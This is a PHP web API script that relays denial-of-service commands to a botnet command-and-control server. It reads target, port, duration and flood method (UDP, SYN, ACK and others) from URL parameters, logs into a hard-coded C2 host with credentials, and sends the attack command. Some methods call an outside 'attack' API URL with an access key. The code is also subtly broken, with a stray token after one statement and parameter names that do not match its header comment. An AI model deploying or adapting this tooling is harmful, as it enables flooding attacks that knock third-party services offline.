<?php
//API Link: http://ServerIP/CiaAPI.php?&ip=IP&port=PORT&time=TIME&method=METHOD
set_time_limit(0);

$server = "70.37.64.81";// Your Server Ip
$conport = 999;// Your C2 Port
$username = "hilix";
$password = "hilix";

$activekeys = array();

$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];

if($method == "STD"){$command = ". STD $target $port $time";}
if($method == "UDP"){$command = ". UDP $target $port $time";}
if($method == "VSE"){$command = ". VSE $target $port $time";}
if($method == "TCP-RAPE"){$command = "http://apiaccess-kuramaservices.xyz/attack?method=tcp-rape&time=TIME&target=IP&port=PORT&key=OxBlood-KEY-11/3/2021-KFOEFOLL";}
if($method == "XMS"){$command = ". XMS $target $port $time";}
if($method == "ACK"){$command = ". ACK $target $port $time";}
if($method == "SYN"){$command = "http://apiaccess-kuramaservices.xyz/attack?method=tcp-rape&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL";}


$sock = fsockopen($server, $conport, $errno, $errstr, 2);

if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 512)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 512)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 512)){
                print(fread($sock, 512)."\n");
        }

        fwrite($sock, $command . "\n");ssss
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>